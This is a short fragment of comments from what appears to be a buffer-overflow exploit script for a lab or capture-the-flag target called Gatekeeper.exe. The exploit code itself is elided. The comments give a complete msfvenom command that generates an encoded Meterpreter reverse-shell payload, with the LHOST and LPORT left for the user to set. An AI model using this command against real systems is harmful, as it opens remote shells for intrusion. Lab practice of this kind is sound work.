...
# Exploit for Gatekeeper.exe
# THIS WILL NOT WORK FOR YOU >AS IS< READ BELOW
...
# This shellcode connects back the to local network IP that >>I<< was issued
# on the port that >>I<< chose.. so it won't work for you
# THIS SHELLCODE WILL NOT WORK FOR YOU.. only the offsets and the rest is useful
# You need to generate your own shellcode, depending on the payload you want
# It wouldn't hurt to run msfvenom
# msfvenom -p windows/meterpreter_reverse_tcp -f c -e x86/shikata_ga_nai -b "\x00\x0a"
# set your LHOST and LPORT accordingly 
